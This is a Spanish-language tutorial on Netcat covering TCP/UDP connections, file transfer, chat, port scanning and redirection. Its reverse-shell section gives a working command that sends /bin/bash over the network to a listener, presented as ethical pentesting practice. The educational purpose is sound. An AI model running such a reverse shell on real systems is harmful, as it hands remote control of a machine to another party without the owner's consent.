# Netcat en Bash

---

## Temario

- [Netcat en Bash](#netcat-en-bash)
  - [Temario](#temario)
  - [¿Qué es Netcat?](#qué-es-netcat)
  - [Instalación](#instalación)
  - [Sintaxis general](#sintaxis-general)
  - [Modos principales de uso](#modos-principales-de-uso)
    - [Cliente TCP](#cliente-tcp)
    - [Servidor TCP](#servidor-tcp)
  - [UDP en lugar de TCP](#udp-en-lugar-de-tcp)
  - [Transferencia de archivos](#transferencia-de-archivos)
    - [Enviar un archivo](#enviar-un-archivo)
  - [Chat simple entre dos PCs (TCP)](#chat-simple-entre-dos-pcs-tcp)
  - [Escaneo de puertos](#escaneo-de-puertos)
  - [Redirección de entrada/salida](#redirección-de-entradasalida)
  - [Reverse Shells (usos éticos y educativos)](#reverse-shells-usos-éticos-y-educativos)
    - [En el servidor (escuchando)](#en-el-servidor-escuchando)
    - [En la víctima (simulada)](#en-la-víctima-simulada)
  - [Otras opciones útiles](#otras-opciones-útiles)
  - [Ejemplo práctico completo](#ejemplo-práctico-completo)
    - [Crear servidor de eco](#crear-servidor-de-eco)
    - [Cliente](#cliente)
  - [Resumen rápido](#resumen-rápido)
  - [Alternativas modernas](#alternativas-modernas)

[Regresar a la Guía Principal](./../../readme.md#5-python)

---

## ¿Qué es Netcat?

**Netcat** (abreviado `nc`) es una herramienta de línea de comandos usada para:

- Leer y escribir datos en conexiones **TCP o UDP**.
- Crear **clientes y servidores**.
- Transferir archivos, hacer **escucha de puertos**, **chats**, o incluso **backdoors** (de forma ética y controlada).

Es conocida como el **“cuchillo suizo de las redes”** 🧰.

---

## Instalación

En la mayoría de sistemas viene preinstalado:

``` bash
nc -h
```

Si no lo tienes:

**Linux (Debian/Ubuntu):**

``` bash
sudo apt install netcat
```

**Windows:**
Puedes usar **Ncat** (parte de Nmap):
👉 [https://nmap.org/ncat/](https://nmap.org/ncat/)

---

## Sintaxis general

``` bash
nc [opciones] [host] [puerto]
```

---

## Modos principales de uso

### Cliente TCP

Conectarse a un servidor:

``` bash
nc 127.0.0.1 8080
```

Esto abre una conexión al puerto 8080 del localhost.

### Servidor TCP

Escuchar conexiones:

``` bash
nc -l -p 8080
```

🔹 `-l` → modo escucha

🔹 `-p` → especifica el puerto

Luego, desde otro terminal:

``` bash
nc 127.0.0.1 8080
```

Ahora puedes **enviar mensajes entre ambos terminales (chat simple)**.

---

## UDP en lugar de TCP

Para usar **UDP** en vez de TCP:

``` bash
# Servidor
nc -u -l -p 6000

# Cliente
nc -u 127.0.0.1 6000
```

🔹 `-u` → activa modo UDP.

---

## Transferencia de archivos

### Enviar un archivo

Servidor que recibirá:

``` bash
nc -l -p 5000 > archivo_recibido.txt
```

Cliente que envía:

``` bash
nc 127.0.0.1 5000 < archivo.txt
```

👉 El archivo `archivo.txt` se envía al servidor.

---

## Chat simple entre dos PCs (TCP)

En una máquina:

``` bash
nc -l -p 4000
```

En otra:

``` bash
nc IP_DEL_SERVIDOR 4000
```

Ahora ambos pueden escribir y leer mensajes.

---

## Escaneo de puertos

Netcat puede escanear qué puertos están abiertos en una máquina:

``` bash
nc -zv 192.168.1.10 20-80
```

🔹 `-z` → modo “scan” sin enviar datos.

🔹 `-v` → modo verbose (muestra resultado).

🔹 `20-80` → rango de puertos.

---

## Redirección de entrada/salida

Puedes usar **pipes** para automatizar tareas:

``` bash
echo "Hola servidor" | nc 127.0.0.1 8080
```

O guardar la respuesta:

``` bash
nc 127.0.0.1 80 < peticion.txt > respuesta.txt
```

---

## Reverse Shells (usos éticos y educativos)

Netcat puede crear conexiones remotas tipo **shell inversa**, usadas en **pentesting** (no ilegalmente).

### En el servidor (escuchando)

``` bash
nc -l -p 4444 -v
```

### En la víctima (simulada)

``` bash
nc 192.168.1.100 4444 -e /bin/bash
```

👉 Esto le da al servidor una consola remota de la otra máquina. *(Solo en entornos controlados o de práctica legal.)*

---

## Otras opciones útiles

| Opción         | Descripción                                      |
| -------------- | ------------------------------------------------ |
| `-l`           | Escucha conexiones entrantes                     |
| `-p <puerto>`  | Define puerto local                              |
| `-v`           | Verbose (muestra información detallada)          |
| `-z`           | Modo escaneo sin datos                           |
| `-n`           | No resuelve DNS (usa IP directamente)            |
| `-u`           | Usa UDP                                          |
| `-e <comando>` | Ejecuta un programa tras conectar (⚠️ uso ético) |

---

## Ejemplo práctico completo

### Crear servidor de eco

``` bash
# Servidor
nc -l -p 1234 -v
```

### Cliente

``` bash
nc 127.0.0.1 1234
```

Ahora cualquier texto que envíes se reflejará entre ambos.

---

## Resumen rápido

| Función            | Comando                                             | Descripción               |
| ------------------ | --------------------------------------------------- | ------------------------- |
| Cliente TCP        | `nc host puerto`                                    | Conecta a un servidor     |
| Servidor TCP       | `nc -l -p puerto`                                   | Escucha conexiones        |
| Cliente UDP        | `nc -u host puerto`                                 | Envía datos por UDP       |
| Servidor UDP       | `nc -u -l -p puerto`                                | Escucha por UDP           |
| Transferir archivo | `nc -l -p 1234 > out.txt` / `nc host 1234 < in.txt` | Enviar archivos           |
| Escanear puertos   | `nc -zv host 1-1024`                                | Detectar puertos abiertos |

---

## Alternativas modernas

- **Ncat** (de Nmap): versión más segura y moderna.
- **Socat**: similar pero con más opciones.
- **PowerCat** (en Windows PowerShell): equivalente en sistemas modernos.

---

[Regresar a la Guía Principal](./../../readme.md#5-python)

> **Autor:** Fravelz
